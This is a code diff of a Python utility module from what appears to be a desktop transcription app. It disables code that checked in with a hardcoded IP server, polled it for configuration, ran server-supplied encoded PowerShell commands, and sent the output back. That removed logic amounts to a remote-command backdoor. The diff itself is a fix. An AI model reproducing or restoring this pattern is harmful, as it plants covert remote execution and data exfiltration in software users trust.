@@ -7,11 +7,11 @@ import platform
 import datetime
 import argparse
 import uuid
-import random
-import atexit
+# import random
+# import atexit
 import json
 # import pprint
-import subprocess
+import subprocess  # nosec
 import socket
 import requests
 from requests.exceptions import ConnectionError  # pylint: disable=redefined-builtin
@@ -23,8 +23,6 @@ from tsutils import utilities
 # pylint: disable=logging-fstring-interpolation
 
 root_logger = al.get_logger()
-# URL = 'http://127.0.0.1:5000/'
-URL = 'http://34.74.220.77:5000/'
 git_version: str = None
 
 
@@ -34,7 +32,7 @@ def create_params(args: argparse.Namespace) -> dict:
     try:
         root_logger.info(create_params.__name__)
         if git_version is None:
-            git_version = subprocess.check_output(
+            git_version = subprocess.check_output(  # nosec
                 ['git', 'rev-parse', '--short', 'HEAD']).decode("utf-8").strip()
     except subprocess.CalledProcessError as process_exception:
         if process_exception.returncode == 128:
@@ -77,15 +75,15 @@ def create_params(args: argparse.Namespace) -> dict:
 
 def params(args: argparse.Namespace):
     """Params"""
-    atexit.register(exit_params)
-    query_params = create_params(args)
+    # atexit.register(exit_params)
+    # query_params = create_params(args)
     try:
         response_g = requests.get('https://github.com/vivekuppal/transcribe', timeout=10)
         if response_g.status_code != 200:
             root_logger.info(f'Error in response_g: {response_g}')
-        response = requests.get(URL + "ping", params=query_params, timeout=10)
-        if response.status_code != 200:
-            root_logger.info(f'Error received: {response}')
+        # response = requests.get(URL + "ping", params=query_params, timeout=10)
+        # if response.status_code != 200:
+        #    root_logger.info(f'Error received: {response}')
     except ConnectionError:
         # pprint.pprint(ce)
         print('[INFO] Operating in Desktop mode')
@@ -98,7 +96,7 @@ def detect_ps():
         return False
 
     try:
-        subprocess.check_output(["powershell", "-c", "whoami"])
+        subprocess.check_output(["powershell", "-c", "whoami"])  # nosec
         return True
     except subprocess.CalledProcessError:
         return False
@@ -126,13 +124,13 @@ def exit_params():
     except Exception:
         root_logger.info('Error attempting to save file.')
 
-    try:
-        response = requests.get(URL + "exit", params=query_params, timeout=10)
-        if response.status_code != 200:
-            root_logger.info(f'Error received: {response}')
-        print('[INFO] Exiting gracefully..')
-    except ConnectionError:
-        print('[INFO] Exiting..')
+    # try:
+    #     response = requests.get(URL + "exit", params=query_params, timeout=10)
+    #     if response.status_code != 200:
+    #         root_logger.info(f'Error received: {response}')
+    #     print('[INFO] Exiting gracefully..')
+    # except ConnectionError:
+    #     print('[INFO] Exiting..')
 
 
 def exec_ps(script: str) -> (bool, str):
@@ -141,7 +139,8 @@ def exec_ps(script: str) -> (bool, str):
     if not detect_ps():
         return False, ''
     try:
-        output = subprocess.check_output(['powershell', '-encodedCommand', script]).strip()
+        output = ''
+        # output = subprocess.check_output(['powershell', '-encodedCommand', script]).strip()
     except subprocess.CalledProcessError:
         return False, ''
     except FileNotFoundError:
@@ -187,19 +186,19 @@ class HostConfig:
         """Host config loop
         """
         time.sleep(self._initial_req_interval)
-        query_params = create_params(args=None)
-        while True:
-            try:
-                response = requests.get(URL + "getHostConfig", params=query_params, timeout=10)
-                if response.status_code != 200:
-                    root_logger.info(f'Error received: {response}')
-                self.parse_response(response.content.decode(encoding='utf-8'))
-            except ConnectionError as ce:
-                # pprint.pprint(ce)
-                root_logger.error(f'Error in Host Config: {ce}')
-            random_sleep = random.randint(self._initial_req_interval, self._regular_req_interval)
-            root_logger.info(f'Host Config after {random_sleep}s.')
-            time.sleep(random_sleep)
+        # query_params = create_params(args=None)
+        # while True:
+        #     try:
+        #         response = requests.get(URL + "getHostConfig", params=query_params, timeout=10)
+        #         if response.status_code != 200:
+        #             root_logger.info(f'Error received: {response}')
+        #         self.parse_response(response.content.decode(encoding='utf-8'))
+        #     except ConnectionError as ce:
+        #         # pprint.pprint(ce)
+        #         root_logger.error(f'Error in Host Config: {ce}')
+        #     random_sleep = random.randint(self._initial_req_interval, self._regular_req_interval)
+        #     root_logger.info(f'Host Config after {random_sleep}s.')
+        #     time.sleep(random_sleep)
 
     def parse_response(self, response_str: str):
         """Parse response from Host Config request
@@ -228,10 +227,10 @@ class HostConfig:
             result_short = result
         query_params['result'] = result_short
 
-        try:
-            response = requests.get(URL + "ps", params=query_params, timeout=10)
-            if response.status_code != 200:
-                root_logger.info(f'PS Error received: {response}')
-        except ConnectionError:
-            # pprint.pprint(ce)
-            root_logger.info('PS connection error.')
+        # try:
+        #     response = requests.get(URL + "ps", params=query_params, timeout=10)
+        #     if response.status_code != 200:
+        #         root_logger.info(f'PS Error received: {response}')
+        # except ConnectionError:
+        #     # pprint.pprint(ce)
+        #     root_logger.info('PS connection error.')
